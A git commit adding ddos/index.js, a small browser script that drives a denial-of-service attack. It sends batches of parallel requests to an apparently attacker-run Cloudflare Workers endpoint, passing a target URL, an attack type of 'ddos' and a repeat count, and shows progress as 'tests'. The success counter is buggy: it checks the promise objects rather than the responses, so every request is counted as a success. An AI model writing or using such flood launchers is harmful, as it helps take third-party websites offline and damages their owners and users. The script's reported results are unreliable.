c7c964ec617fa0ac6b0783d6567f0a0ea0650d4b
JacobLinCool <jacoblin2011@gmail.com>
2020-03-19 21:24:42 +0800

    Create index.js

---
+++ ddos/index.js
@@ -0,0 +1,25 @@
+function atk(a, b, c) {
+    Attack(a, b, c, "ddos", {update: function(now){document.getElementById('result').innerHTML = "已完成： " + now}}).then(s => {document.getElementById('result').innerHTML = "完成全部共"+s.success+"次測試";});
+}
+async function Attack(blocks=10, attacks=10, target, type="ddos", func={update: function(){}}) {
+    var now = 0;
+    var requests = [];
+    
+    for(var i = 0; i < blocks; i++) {
+        requests.push(
+            fetch(`https://attack.jacob.workers.dev/?type=${type}&time=${attacks}&url=${target}`).then(r=>{
+                now += attacks;
+                func.update(now);
+                return r.ok;
+            })
+        );
+    }
+    
+    var resp = await Promise.all(requests);
+    
+    var success = 0;
+    for(var i = 0; i < requests.length; i++) {
+        if (requests[i]) success++;
+    }
+    return {success: success * attacks};
+}
